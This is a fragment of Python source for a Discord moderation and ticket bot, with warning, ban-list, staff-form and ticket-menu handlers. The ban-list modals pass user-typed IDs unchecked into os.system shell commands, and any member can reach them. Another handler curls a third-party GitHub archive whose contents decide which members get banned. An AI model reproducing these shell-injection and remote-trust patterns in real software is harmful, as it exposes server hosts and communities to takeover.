            if not os.path.exists(f"systems\\staff-forms\\staff-forms\\list\\{interaction.user.id}"):
                await interaction.response.send_modal(staff())
        if lock == "false":
            await interaction.response.send_message(f'Staff Forms is Locked', ephemeral=True)

class staffteampanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='〈⚠️〉Addwarn', style=discord.ButtonStyle.red, custom_id='Verify1_view:addwarn')
    async def addwarn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            bot.role = interaction.guild.get_role(rolestaff)
            if bot.role not in interaction.user.roles:
                await interaction.response.send_message(f"You don't have permission", ephemeral = True)
            if bot.role in interaction.user.roles:
                await interaction.response.send_modal(addwarn())
        except:
            await interaction.response.send_message(f'The role is not set or the system is not working', ephemeral=True)


    @discord.ui.button(label='〈❕〉Checkwarns', style=discord.ButtonStyle.blurple, custom_id='Verify1_view:cwarn')
    async def cwarn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            bot.role = interaction.guild.get_role(rolestaff)
            if bot.role not in interaction.user.roles:
                await interaction.response.send_message(f"You don't have permission", ephemeral = True)
            if bot.role in interaction.user.roles:
                await interaction.response.send_modal(cwarn())
        except:
            await interaction.response.send_message(f'The role is not set or the system is not working', ephemeral=True)
    


    @discord.ui.button(label='〈❓〉Remove Warn', style=discord.ButtonStyle.green, custom_id='Verify1_view:rwarn')
    async def rwarn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            bot.role = guild.get_role(rolestaff)
            if bot.role not in interaction.user.roles:
                await interaction.response.send_message(f"You don't have permission", ephemeral = True)
            if bot.role in interaction.user.roles:
                await interaction.response.send_modal(rrrwarn())
        except:
            await interaction.response.send_message(f'The role is not set or the system is not working', ephemeral=True)



    @discord.ui.button(label="〈📋〉Send forms", style=discord.ButtonStyle.grey, custom_id="st_view:stt")
    async def stt(self, interaction: discord.Interaction, button: discord.ui.Button):
        warn = open("systems\\staff-forms\\lock.txt", "r")
        warnlist = warn.read()
        warn.close()
        if warnlist == "true":
            await interaction.response.send_modal(staffs())
        if warnlist != "true":
            await interaction.response.send_message("Staff Forms is Disabled", ephemeral=True)
    
class AdminPanel1(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="〈🚫〉Scan BanList", style=discord.ButtonStyle.red, custom_id="adminpanel_view:banlist")
    async def banlist(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            f = open(f"systems\\Adminpanel\\ebanlist.txt", "r")
            banlist = f.read()
            f.close()
            if banlist == "true":
                for filename in os.listdir(f"systems\\Adminpanel\\banlist"):
                    try:
                        member = guild.get_member(int(filename))
                        await member.ban(reason=f"BanList")
                    except:
                        pass
                await interaction.response.send_message(f'BanList Updated', ephemeral=True)
            if banlist == "false":
                await interaction.response.send_message(f'BanList is Disabled', ephemeral=True)
        except:
            pass
        



    @discord.ui.button(label="〈⭕️〉Add BanList", style=discord.ButtonStyle.red, custom_id="adminpanel_view:banlista")
    async def banlista(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            f = open(f"systems\\Adminpanel\\ebanlist.txt", "r")
            banlist = f.read()
            f.close()
            memberid = guild.get_member(interaction.user.id)
            if banlist == "true":
                    await interaction.response.send_modal(addbanlist())
            if banlist == "false":
                await interaction.response.send_message(f'BanList is Disabled', ephemeral=True)
        except:
            await interaction.response.send_message(f'Error', ephemeral=True)
    

    @discord.ui.button(label="〈❌〉Remove BanList", style=discord.ButtonStyle.red, custom_id="adminpanel_view:banlistr")
    async def banlistr(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            f = open(f"systems\\Adminpanel\\ebanlist.txt", "r")
            banlist = f.read()
            f.close()
            memberid = guild.get_member(interaction.user.id)
            if banlist == "true":
                    await interaction.response.send_modal(removebanlist())
            if banlist == "false":
                await interaction.response.send_message(f'BanList is Disabled', ephemeral=True)
        except:
            await interaction.response.send_message(f'Error', ephemeral=True)


    @discord.ui.button(label="〈🔍〉Update BanList", style=discord.ButtonStyle.green, custom_id="adminpanel_view:banlistru")
    async def banlistru(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            f = open(f"systems\\Adminpanel\\ebanlist.txt", "r")
            banlist = f.read()
            f.close()
            memberid = guild.get_member(interaction.user.id)
            if banlist == "true":
                await interaction.response.send_message(f'BanList Updated', ephemeral=True)
                os.system("curl -L -O https://github.com/kaneki2876/banlist/archive/refs/heads/main.zip")
                os.system("rmdir /s /q systems\\Adminpanel\\banlist")
                os.system("tar -xf main.zip")
                os.system("move banlist-main systems\\Adminpanel\\banlist")
                os.system("del main.zip")
            if banlist == "false":
                await interaction.response.send_message(f'BanList is Disabled', ephemeral=True)
        except:
            await interaction.response.send_message(f'Error', ephemeral=True)

class removebanlist(ui.Modal, title='BanList Response'):
    banlistidd = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            os.system(f"del systems\\Adminpanel\\banlist\\{self.banlistidd}")
        except:
            pass
        await interaction.response.send_message(f'BanList Updated', ephemeral=True)


class addbanlist(ui.Modal, title='BanList Response'):
    banlistid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            try:
                if self.banlistid != discordid:
                    os.system(f"echo > systems\\Adminpanel\\banlist\\{self.banlistid}")
                else:
                    pass
            except:
                pass
            await interaction.response.send_message(f'BanList Updated', ephemeral=True)
        except:
            pass

class staffs(ui.Modal, title='staff forms Send'):
    staffforms = ui.TextInput(label="Update on forms for the Staff (Channel ID)")
    staffforms1 = ui.TextInput(label="Your Message", style=discord.TextStyle.paragraph)
    

    async def on_submit(self, interaction: discord.Interaction):
        embed=discord.Embed(title=f"**〈📕〉Staff Forms**", description=f"**Staff Forms Update\n@everyone**", color=0xff0000)
        embed.add_field(name=f"〈📖〉Staff Forms", value=f"**The forms for the Staff are now open and you are are welcome to submit them.**", inline=True)
        embed.add_field(name=f"〈📄〉{interaction.user.name} Message", value=f"**{self.staffforms1}**", inline=True)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        c = open("2.txt", "w", encoding="utf-8")
        c.write(f"{self.staffforms}")
        c.close()
        c = open("2.txt", "r")
        channelid = int(c.read())
        c.close()
        os.system("del 2.txt")
        channel = discord.utils.get(guild.channels, id=channelid)
        await channel.send(embed=embed, view=staffforms())
        pointsf = f"systems\\staff-forms"
        f = open(f"{pointsf}\\channel.txt", "w", encoding="utf-8")
        f.write(f"{self.staffforms}")
        f.close()
        f = open(f"{pointsf}\\message.txt", "w", encoding="utf-8")
        f.write(f"{self.staffforms1}")
        f.close()
        f = open(f"{pointsf}\\user.txt", "w", encoding="utf-8")
        f.write(f"{interaction.user.name}")
        f.close()
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)



if ticketnumber == 1:
    class ticketselect1(discord.ui.View):
        @discord.ui.select(
            placeholder = "select menu",
            min_values = 1,
            max_values = 1,
            options = [
                discord.SelectOption(
                    label=f"{ticketSname1}",
                    description=f"{ticketSdes1}",
                    emoji=f"{ticketSem1}"
                ),
            ]
        )
        async def select_callback(self, select, interaction: discord.Interaction,):
            categoryticketopen = open("systems\\ticket\\category-ticket-open.txt", "r")
            categoryticketopenid = int(categoryticketopen.read())
            ticket_staff = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
            ticket_staff_role = int(ticket_staff.read())
            rolee = discord.utils.get(guild.roles, id=ticket_staff_role)
            if interaction.values[0] == ticketSname1:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                            try:
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes1}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is has been created\n``Information about the user - \n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes1}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            ticket_staff.close()
            categoryticketopen.close()



if ticketnumber == 2:
    class ticketselect2(discord.ui.View):
        @discord.ui.select(
            placeholder = "select menu",
            min_values = 1,
            max_values = 1,
            options = [
                discord.SelectOption(
                    label=f"{ticketSname2}",
                    description=f"{ticketSdes2}",
                    emoji=f"{ticketSem2}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname21}",
                    description=f"{ticketSdes21}",
                    emoji=f"{ticketSem21}"
                ),
            ]
        )
        async def select_callback(self, select, interaction: discord.Interaction,):
            categoryticketopen = open("systems\\ticket\\category-ticket-open.txt", "r")
            categoryticketopenid = int(categoryticketopen.read())
            ticket_staff = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
            ticket_staff_role = int(ticket_staff.read())
            rolee = discord.utils.get(guild.roles, id=ticket_staff_role)
            if interaction.values[0] == ticketSname2:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                            try:
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes2}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes2}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            if interaction.values[0] == ticketSname21:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes21}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes21}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            ticket_staff.close()
            categoryticketopen.close()
            



if ticketnumber == 3:
    class ticketselect3(discord.ui.View):
        @discord.ui.select(
            placeholder = "select menu",
            min_values = 1,
            max_values = 1,
            options = [
                discord.SelectOption(
                    label=f"{ticketSname3}",
                    description=f"{ticketSdes3}",
                    emoji=f"{ticketSem3}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname31}",
                    description=f"{ticketSdes31}",
                    emoji=f"{ticketSem31}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname32}",
                    description=f"{ticketSdes32}",
                    emoji=f"{ticketSem32}"
                ),
            ]
        )
        async def select_callback(self, select, interaction: discord.Interaction,):
            categoryticketopen = open("systems\\ticket\\category-ticket-open.txt", "r")
            categoryticketopenid = int(categoryticketopen.read())
            ticket_staff = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
            ticket_staff_role = int(ticket_staff.read())
            rolee = discord.utils.get(guild.roles, id=ticket_staff_role)
            if interaction.values[0] == ticketSname3:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                            try:
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes3}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes3}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            if interaction.values[0] == ticketSname31:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSname31}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSname31}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            
            if interaction.values[0] == ticketSname32:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSname32}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSname32}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            ticket_staff.close()
            categoryticketopen.close()




if ticketnumber == 4:
    class ticketselect4(discord.ui.View):
        @discord.ui.select(
            placeholder = "select menu",
            min_values = 1,
            max_values = 1,
            options = [
                discord.SelectOption(
                    label=f"{ticketSname4}",
                    description=f"{ticketSdes4}",
                    emoji=f"{ticketSem4}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname41}",
                    description=f"{ticketSdes41}",
                    emoji=f"{ticketSem41}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname42}",
                    description=f"{ticketSdes42}",
                    emoji=f"{ticketSem42}"
                ),
                discord.SelectOption(
                    label=f"{ticketSname43}",
                    description=f"{ticketSdes43}",
                    emoji=f"{ticketSem43}"
                ),
            ]
        )
        async def select_callback(self, select, interaction: discord.Interaction,):
            categoryticketopen = open("systems\\ticket\\category-ticket-open.txt", "r")
            categoryticketopenid = int(categoryticketopen.read())
            ticket_staff = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
            ticket_staff_role = int(ticket_staff.read())
            rolee = discord.utils.get(guild.roles, id=ticket_staff_role)
            if interaction.values[0] == ticketSname4:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                            try:
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes4}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes4}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
